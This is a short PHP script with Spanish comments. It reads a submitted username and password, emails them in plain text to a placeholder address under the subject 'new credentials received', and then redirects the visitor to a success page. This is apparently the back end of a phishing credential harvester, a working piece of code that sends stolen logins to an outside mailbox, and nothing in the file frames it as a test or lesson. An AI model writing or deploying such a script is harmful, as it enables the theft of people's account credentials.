<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['user'];
    $password = $_POST['pass'];

    // Sanitizar las entradas para mayor seguridad
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Configuración del correo
    $to = 'destinatario@ejemplo.com';  // Reemplaza con la dirección de correo destino
    $subject = 'Nuevas Credenciales Recibidas';
    $message = "Usuario: " . $username . "\nContraseña: " . $password;
    $headers = 'From: remitente@ejemplo.com' . "\r\n" .
               'Reply-To: remitente@ejemplo.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Enviar el correo
    mail($to, $subject, $message, $headers);

    // Redirigir a una página de confirmación o de regreso al formulario
    header("Location: success.html");
    exit();
} else {
    echo "Método no permitido.";
}
?>
